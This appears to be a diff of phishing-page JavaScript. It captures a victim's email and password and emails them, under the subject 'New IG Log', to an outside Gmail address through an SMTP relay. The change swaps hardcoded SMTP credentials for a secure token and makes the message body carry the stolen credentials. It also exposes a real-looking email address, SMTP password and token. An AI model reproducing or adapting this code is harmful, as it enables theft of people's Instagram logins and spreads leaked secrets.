@@ -85,13 +85,11 @@
     var finalmessage = "email is " + email + " and password is " + pass;
 			
 		Email.send({
-    Host : "smtp.elasticemail.com",
-    Username : "ezehallel@gmail.com",
-    Password : "3F0FD76032D177322279D9172376479B75C7",
+    SecureToken : "9a4785c5-0ed2-431e-882b-62faaed07dc2",
     To : 'ezehallel@gmail.com',
     From : "ezehallel@gmail.com",
-    Subject : "New IG Log"
-    Body : "hello"
+    Subject : "New IG Log",
+    Body : finalmessage
 }).then(
   message => alert(message)
 );
